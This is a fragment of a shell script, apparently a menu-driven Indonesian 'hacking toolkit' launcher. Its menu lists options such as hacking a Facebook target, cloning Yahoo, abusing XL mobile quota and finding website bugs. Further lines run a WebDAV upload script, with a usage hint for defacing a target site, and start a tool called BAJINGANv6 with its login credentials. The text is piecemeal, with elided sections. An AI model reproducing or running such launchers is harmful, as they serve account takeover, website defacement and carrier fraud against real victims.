...
echo "[59] Install Cloning Yahoo" | lolcat
echo "[60] Tembak Kuota Xl" | lolcat
echo "[61] Hack Lampu Listrik" | lolcat
echo "[62] 540 Dark Fly" | lolcat
echo "[63] Encrypt sc Python" | lolcat
echo "[64] Hack Facebook Target" | lolcat
echo "[65] Mencari Bug Website" | lolcat
echo "[00] Exit" | lolcat
...
mv HnVyQPtR webdav.py
python2 webdav.py
echo "ketik python2 webdav.py http://sitetarget.com sckalian.html"
fi
...
cd BAJINGANv6
sh BAJINGAN.sh
echo "USERNAME & PW = BAJINGAN & Gans"
fi
